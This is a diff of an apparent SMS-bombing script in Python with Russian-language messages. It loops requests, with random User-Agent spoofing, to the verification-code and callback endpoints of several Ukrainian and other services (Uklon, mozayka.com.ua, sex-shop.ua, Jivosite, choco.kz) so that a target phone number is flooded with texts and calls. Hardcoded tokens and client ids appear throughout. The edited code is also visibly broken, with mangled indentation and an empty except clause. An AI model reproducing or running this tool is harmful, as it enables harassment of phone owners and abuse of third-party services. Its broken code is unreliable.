@@ -48,16 +48,22 @@ run = int(console.input('[green]Введите количество повтор
 def ukr():
         for _ in track(range(run)):
                 headers = {"User-Agent": fake_useragent.UserAgent().random}
-                try:
-                         requests.post("https://mozayka.com.ua/!processing/ajax.php", headers=headers, data={"phone": "+" + self.formatted_phone, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"})
-                except:
-                        pass
-                try:
-                         requests.post("https://uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": self.formatted_phone})
-                except:
-                        pass
-                try:
-                         requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": self.formatted_phone})
+ try:
+     print('мазайкааа')
+     requests.post("https://mozayka.com.ua/!processing/ajax.php", headers=headers, data={"phone": "+" + self.formatted_phone, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"})
+     print('НЕ отправлено мазайка')
+except:
+
+ try:
+     print('уклон вход')
+     requests.post("https://uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": self.formatted_phone})
+ except:
+     print('Не отправельно уклон вход')
+ try:
+     print('уклон регастратура')
+     requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": self.formatted_phone})
+ except:
+     print('Не отправельно уклон регестратура')
 
 
 
@@ -66,22 +72,12 @@ def ukr():
 
 
 def russ():
-        for _ in track(range(run)):
+         for _ in track(range(run)):
                 headers = {"User-Agent": fake_useragent.UserAgent().random}
-        try:
-                requests.post("https://sex-shop.ua/bitrix/components/bxmaker/authuserphone.login/ajax.php", data={"parameters": "YToxOntzOjEwOiJDQUNIRV9UWVBFIjtzOjE6IkEiO30=.886837943a18715db75ae7fe96ae97183ca0be0637a0bc22ca3ba8d04e55b81f", "template": ".default.0439327cbb51aa71d187d378db240bf43d3133d2e235a6d74509561d345ec422", "siteId": "s1", "sessid": "48add65add0e6c591d7aae265c20b0db", "method": "sendCode", "phone": "+" + number, "regustration": "Y"}, headers=headers)
-                pass
-        except:
-                pass
-        try:
-                requests.post("https://telephony.jivosite.com/api/1/sites/900909/widgets/OVHsL3W8hY/clients/17314/telephony/callback", data={"phone": number, "invitation_text": ""}, headers=headers)
-                pass
-        except:
-                pass
-        try:
+            try:
                 requests.post("https://api-proxy.choco.kz/user/v2/code", data={"login": number, "client_id": "-5", "dispatch_type": "call"}, headers=headers)
                 pass
-        except:
+         except:
                 pass
 
 
